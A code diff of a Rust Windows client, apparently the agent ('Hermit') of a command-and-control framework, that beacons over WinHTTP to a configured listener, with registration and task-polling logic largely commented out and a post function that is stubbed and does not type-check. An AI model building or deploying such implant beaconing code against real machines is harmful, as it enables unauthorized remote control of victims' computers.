@@ -1,211 +1,165 @@
-use std::ffi::c_void;
-use std::mem;
-use std::thread;
-use std::time;
-use windows::{
-    core::*,
-    Win32::{
-        Foundation::*,
-        Networking::WinHttp::*,
-        System::{Com::*, Memory::*, Threading::*},
-    }
-};
-
-use crate::Config;
-
-trait ToWide {
-    fn to_utf16(self) -> Vec<u16>;
-}
-
-impl ToWide for &str {
-    fn to_utf16(self) -> Vec<u16> {
-        self.encode_utf16().chain(Some(0)).collect::<Vec<_>>()
-    }
-}
-
 // References:
 //  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
 //  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
-pub fn run(config: Config) -> Result<()> {
+use std::ffi::c_void;
+use std::thread;
+use std::time;
+use windows::{
+    core::{Error, HSTRING, PCWSTR, w},
+    Win32::{
+        Networking::WinHttp::*,
+        System::SystemInformation::GetComputerNameExA,
+    }
+};
+
+use crate::agents::RegisterAgent;
+use crate::Config;
+use crate::handlers::handlers_windows::Handlers;
+use crate::systeminfo::systeminfo_windows::{get_computer_name, get_systeminfo};
+
+pub fn run(config: Config) -> Result<(), Error> {
+    let mut h = Handlers::new();
+    
     let sleep = time::Duration::from_secs(config.sleep);
 
-    // Test request
-    request(
-        config.listener.proto.to_string(),
-        config.listener.host.to_string(),
-        config.listener.port.to_owned(),
-        "/".to_string(),
-        "GET".to_string(),
-    );
+    let mut agent = HSTRING::from("Hermit");
+
+    if let Err(e) = h.open_session(agent) {
+        println!("Error opening session: {}", e);
+        return Err(e);
+    };
+
+    if let Err(e) = h.connect(
+        HSTRING::from(config.listener.host.to_string()),
+        config.listener.port,
+    ) {
+        println!("Error connection: {}", e);
+        return Err(e);
+    };
+
+    // Test request hello
+    let response = get(&mut h, "/");
+    match response {
+        Ok(resp) => println!("{resp}"),
+        Err(e) => println!("{:?}", e),
+    }
 
     thread::sleep(sleep);
+    
+    // Get agent info and register
+    // let hostname = match get_computer_name() {
+    //     Ok(name) => name,
+    //     Err(e) => "unknown".to_string(),
+    // };
+    // let listener_url = format!(
+    //     "{}://{}:{}/",
+    //     config.listener.proto.to_string(),
+    //     config.listener.host.to_string(),
+    //     config.listener.port.to_owned(),
+    // );
+
+    // let ra = RegisterAgent::new(hostname, listener_url);
+    // let ra_json = serde_json::to_string(&ra).unwrap();
 
     // Register agent
-    request(
-        config.listener.proto.to_string(),
-        config.listener.host.to_string(),
-        config.listener.port.to_owned(),
-        "/reg".to_string(),
-        "POST".to_string(),
-    );
+    // send_post_req(&mut state);
 
-    thread::sleep(sleep);
+    // let response = request(
+    //     &mut state,
+    //     "/reg".to_string(),
+    //     "POST".to_string(),
+    //     Some(ra_json),
+    // );
 
-    loop {
-        // Check task
-        request(
-            config.listener.proto.to_string(),
-            config.listener.host.to_string(),
-            config.listener.port.to_owned(),
-            "/task".to_string(),
-            "GET".to_string(),
-        );
+    // match response {
+    //     Ok(resp) => println!("{resp}"),
+    //     Err(e) => println!("Error"),
+    // }
 
-        thread::sleep(sleep);
-    }
+    // thread::sleep(sleep);
+
+    // return Ok(());
+
+    // loop {
+    //     // TODO: Implement graceful shutdown.
+
+    //     // Check task
+    //     request(
+    //         &mut state,
+    //         config.listener.proto.to_string(),
+    //         "/task".to_string(),
+    //         "GET".to_string(),
+    //         None,
+    //     );
+
+    //     thread::sleep(sleep);
+    // }
+
+    h.close_handles();
 
     Ok(())
 }
 
-fn request(proto: String, host: String, port: u16, url_path: String, method: String) {
-    unsafe {
-        let mut agent = HSTRING::from("test");
-    
-        let mut host = HSTRING::from(host);
-        let mut url_path = HSTRING::from(url_path);
-        let mut method = HSTRING::from(method);
-    
-        let mut h_session: *mut c_void = std::ptr::null_mut();
-        let mut h_connect: *mut c_void = std::ptr::null_mut();
-        let mut h_request: *mut c_void = std::ptr::null_mut();
-        let mut b_results = Ok(());
-    
-        let mut dw_size: usize = 0;
-        let mut dw_downloaded: usize = 0;
-        let mut out_buffer = Vec::new();
-        let mut psz_out_buffer: *mut c_void = &mut out_buffer as *mut _ as *mut c_void;
+fn get(h: &mut Handlers, url_path: &str) -> Result<String, Error> {
+    h.open_request(
+        HSTRING::from("GET".to_string()),
+        HSTRING::from(url_path.to_string()),
+    ).unwrap();
 
-        let h_session = WinHttpOpen(
-            &agent,
-            WINHTTP_ACCESS_TYPE_NO_PROXY,
-            &HSTRING::new(),
-            &HSTRING::new(),
-            WINHTTP_FLAG_ASYNC);
+    let result = h.send_req(0, 0);
+    if result.is_err() {
+        return Err(Error::from_win32());
+    }
 
-        // WinHttpSetOption(
-        //     h_session,
-        //     WINHTTP_OPTION_HTTP2_KEEPALIVE,
-        //     &15000u32 as *const _ as *const c_void,
-        // );
-
-        if h_session.is_null() {
-            println!("Error: h_session is null.");
-            return;
-        }
-
-        h_connect = WinHttpConnect(
-            h_session,
-            &host,
-            port,
-            0);
-
-        if h_connect.is_null() {
-            println!("Error: h_connect is null.");
-            return;
-        }
-
-        h_request = WinHttpOpenRequest(
-            h_connect,
-            &method,
-            &url_path,
-            PCWSTR::null(),
-            PCWSTR::null(),
-            std::ptr::null_mut(),
-            // WINHTTP_FLAG_SECURE,
-            WINHTTP_OPEN_REQUEST_FLAGS(0), // Use this instead of `WINHTTP_FLAG_SECURE` because the request data is buggy when using `WINHTT_FLAG_SECURE`.
-        );
-
-        // Add headers
-        // WinHttpAddRequestHeaders(
-        //     h_request,
-        //     &w!("Content-Type: text/plain; charset=utf-8").as_wide(),
-        //     WINHTTP_ADDREQ_FLAG_ADD,
-        // );
-
-        if h_request.is_null() {
-            println!("Error: h_request is null.");
-            return;
-        }
-
-        b_results = WinHttpSendRequest(
-            h_request,
-            Some(&[0]),
-            Some(std::ptr::null()),
-            0,
-            0,
-            0);
-
-        if b_results.is_ok() {
-            b_results = WinHttpReceiveResponse(h_request, std::ptr::null_mut());
-        }
-
-        match b_results {
-            Ok(_) => {
-                loop {
-                    dw_size = 0;
-    
-                    if let Err(e) = WinHttpQueryDataAvailable(h_request, std::ptr::null_mut()) {
-                        println!("Error querying data available: {e}");
-                    }
-    
-                    out_buffer = vec![0; dw_size + 1];
-                    if psz_out_buffer.is_null() {
-                        println!("Out of memory.");
-                        break;
-                        dw_size = 0;
-                    } else {
-                        // Read the Data.
-                        psz_out_buffer = mem::zeroed();
-    
-                        let r = WinHttpReadData(
-                            h_request,
-                            psz_out_buffer,
-                            out_buffer.len() as u32,
-                            std::ptr::null_mut(),
-                        );
-    
-                        if let Ok(r) = r {
-                            println!("OK");
-                        } else {
-                            println!("Error");
-                        }
-                        
-                        // delete[] pszOutBuffer;
-                    }
-    
-                    if dw_size > 0 {
-                        break;
-                    }
-                }
-            }
-            Err(e) => {
-                println!("Error response: {:#?}", e);
-            }
-        }
-    
-        // Close any open handles.
-        if !h_request.is_null() {
-            WinHttpCloseHandle(h_request);
-        }
-        if !h_connect.is_null() {
-            WinHttpCloseHandle(h_connect);
-        }
-        if !h_session.is_null() {
-            WinHttpCloseHandle(h_session);
-        }
+    let response = h.recv_resp();
+    match response {
+        Ok(resp) => {
+            return Ok(resp);
+        },
+        Err(e) => {
+            println!("Error response: {}", e);
+            return Err(e);
+        },
     }
 }
 
-fn to_utf16(text: &str) -> Vec<u16> {
-    text.encode_utf16().chain(Some(0)).collect::<Vec<_>>()
+fn post(h: &mut Handlers, url_path: &str, data: String) -> Result<String, Error> {
+    h.open_request(
+        HSTRING::from("POST".to_string()),
+        HSTRING::from(url_path.to_string()),
+    ).unwrap();
+
+    let total_length = match data {
+        Some(ref d) => d.len(),
+        None => 0,
+    };
+
+    let rt = tokio::runtime::Runtime::new().unwrap();
+    rt.block_on(async {
+        tokio::spawn(async move {
+            // TODO: implemnt the process to send request
+
+
+        });
+    });
+
+    // let result = h.send_req(totla_length, 0);
+    // if result.is_err() {
+    //     return Err(Error::from_win32());
+    // }
+
+    // for char in d.chars() {
+    //     let buf = &[char as u8];
+    //     let dw_num_of_bytes_to_write = 1;
+
+    //     let lpdw_num_of_bytes_written_op: *mut u32 = match Some(d.len()) {
+    //         Some(op) => op as *mut u32,
+    //         None => std::ptr::null_mut(),
+    //     };
+
+    //     self.write_data(buf, lpdw_num_of_bytes_written_op);
+    //     println!("Write: {}", char.to_string());
+    // }
+
+    Ok("test".to_string())
 }
